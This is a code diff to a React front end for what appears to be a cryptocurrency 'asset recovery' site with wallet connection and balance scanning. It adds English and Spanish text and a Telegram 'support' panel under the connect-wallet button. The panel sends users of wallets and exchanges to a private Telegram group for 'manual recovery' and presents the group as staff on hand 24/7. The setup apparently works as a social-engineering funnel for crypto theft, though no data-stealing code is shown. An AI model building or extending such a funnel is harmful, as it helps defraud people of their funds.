@@ -98,7 +98,13 @@ const TRANSLATIONS = {
     reportSent: 'Report sent successfully! Support will contact you shortly.',
     processingReport: 'Sending report...',
     reportError: 'Failed to send report. Please try again.',
-    contactInfo: 'We\'ll follow up via email within 24 hours.'
+    contactInfo: 'We\'ll follow up via email within 24 hours.',
+    telegramSupport: 'Telegram Support',
+    telegramJoin: 'Join Our Community',
+    telegramDesc: 'Facing connection issues? Using an unsupported exchange? Our support team is active 24/7 on Telegram to help you recover your assets.',
+    telegramButton: 'Join Telegram Community',
+    connectionHelp: 'Connection Problems?',
+    manualReachout: 'Manual Support'
   },
   es: {
     serviceActive: 'PROTOCOLO DE RECUPERACIÓN · ACTIVO',
@@ -163,7 +169,13 @@ const TRANSLATIONS = {
     reportSent: '¡Reporte enviado! Te contactaremos pronto.',
     processingReport: 'Enviando reporte...',
     reportError: 'Error al enviar. Intenta de nuevo.',
-    contactInfo: 'Te contactaremos por email en 24 horas.'
+    contactInfo: 'Te contactaremos por email en 24 horas.',
+    telegramSupport: 'Soporte por Telegram',
+    telegramJoin: 'Únete a Nuestra Comunidad',
+    telegramDesc: '¿Problemas de conexión? ¿Usas un exchange no compatible? Nuestro equipo de soporte está activo 24/7 en Telegram para ayudarte a recuperar tus activos.',
+    telegramButton: 'Unirse a Telegram',
+    connectionHelp: '¿Problemas de conexión?',
+    manualReachout: 'Soporte Manual'
   }
 };
 
@@ -585,6 +597,69 @@ const ReportIssue = ({ translations, address, balances, userLocation }) => {
           </span>
         ) : sent ? '✓ Sent!' : translations.sendReport}
       </button>
+    </div>
+  );
+};
+
+// ============================================
+// TELEGRAM SUPPORT COMPONENT - ENHANCED & DETAILED
+// ============================================
+const TelegramSupport = ({ translations }) => {
+  const TELEGRAM_GROUP_LINK = 'https://t.me/+UUhEUx9wBW5jZGQ1';
+  const [showTooltip, setShowTooltip] = useState(false);
+
+  return (
+    <div className="bg-gradient-to-br from-blue-500/10 to-purple-500/5 border border-blue-500/30 backdrop-blur rounded-xl p-6 mt-6 transition-all duration-300 hover:border-blue-400/50 hover:shadow-lg hover:shadow-blue-500/10">
+      <div className="flex items-start gap-4">
+        <div className="flex-shrink-0">
+          <div className="w-14 h-14 bg-gradient-to-br from-blue-500 to-blue-600 rounded-2xl flex items-center justify-center shadow-lg animate-pulse-glow">
+            <svg className="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 24 24">
+              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.66-.35-1.02.22-1.62.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.13-.08-.18-.09-.05-.23-.03-.33-.01-.15.03-2.55 1.62-3.61 2.28-.34.23-.65.34-.93.34-.3 0-.79-.15-1.18-.28-.48-.15-.87-.23-.84-.49.02-.14.21-.28.57-.43 2.24-.98 3.79-1.62 4.66-1.94 2.22-.82 2.68-.96 2.98-.96.07 0 .22.02.32.12.08.08.1.19.07.29-.03.1-.12.22-.24.34zm-.21 5.45c-.12.62-.23 1.21-.35 1.78-.12.57-.22 1.03-.31 1.4-.09.37-.16.63-.19.71z"/>
+            </svg>
+          </div>
+        </div>
+        <div className="flex-1">
+          <div className="flex items-center gap-2 mb-2 flex-wrap">
+            <h3 className="text-xl font-bold text-blue-400">{translations.telegramSupport}</h3>
+            <span className="bg-green-500/20 text-green-400 text-xs px-2 py-0.5 rounded-full flex items-center gap-1">
+              <span className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
+              24/7 ACTIVE
+            </span>
+          </div>
+          <p className="text-gray-300 text-sm leading-relaxed mb-3">
+            {translations.telegramDesc}
+          </p>
+          <div className="bg-black/40 rounded-lg p-3 mb-4 border border-blue-500/20">
+            <div className="flex items-start gap-2 text-xs text-gray-400">
+              <span className="text-blue-400">🔗</span>
+              <div>
+                <p className="font-semibold text-gray-300 mb-1">{translations.connectionHelp}</p>
+                <p>• Wallet connection failed?<br/>• Using an exchange like Binance, Coinbase, or Kraken?<br/>• Transaction not showing?<br/>• Need manual recovery assistance?</p>
+                <p className="mt-2 text-blue-300">→ Our support team will guide you through the manual recovery process.</p>
+              </div>
+            </div>
+          </div>
+          <a
+            href={TELEGRAM_GROUP_LINK}
+            target="_blank"
+            rel="noopener noreferrer"
+            onMouseEnter={() => setShowTooltip(true)}
+            onMouseLeave={() => setShowTooltip(false)}
+            className="inline-flex items-center gap-2 bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600 text-white font-semibold px-5 py-2.5 rounded-xl transition-all duration-300 transform hover:scale-105 shadow-lg shadow-blue-500/25 relative"
+          >
+            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.66-.35-1.02.22-1.62.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.13-.08-.18-.09-.05-.23-.03-.33-.01-.15.03-2.55 1.62-3.61 2.28-.34.23-.65.34-.93.34-.3 0-.79-.15-1.18-.28-.48-.15-.87-.23-.84-.49.02-.14.21-.28.57-.43 2.24-.98 3.79-1.62 4.66-1.94 2.22-.82 2.68-.96 2.98-.96.07 0 .22.02.32.12.08.08.1.19.07.29-.03.1-.12.22-.24.34zm-.21 5.45c-.12.62-.23 1.21-.35 1.78-.12.57-.22 1.03-.31 1.4-.09.37-.16.63-.19.71z"/>
+            </svg>
+            {translations.telegramButton}
+            <span className="text-xs bg-white/20 px-2 py-0.5 rounded-full">@recovery_support</span>
+            {showTooltip && (
+              <div className="absolute bottom-full left-1/2 transform -translate-x-1/2 mb-2 px-2 py-1 bg-gray-900 text-white text-xs rounded shadow-lg whitespace-nowrap z-10">
+                Click to join Telegram group
+              </div>
+            )}
+          </a>
+        </div>
+      </div>
     </div>
   );
 };
@@ -1498,6 +1573,11 @@ function App() {
               </div>
             </div>
           )}
+
+          {/* ============================================ */}
+          {/* TELEGRAM SUPPORT SECTION - AFTER CONNECT WALLET BUTTON */}
+          {/* ============================================ */}
+          <TelegramSupport translations={translations} />
 
           {/* SCANNING ANIMATION */}
           {isConnected && scanning && (
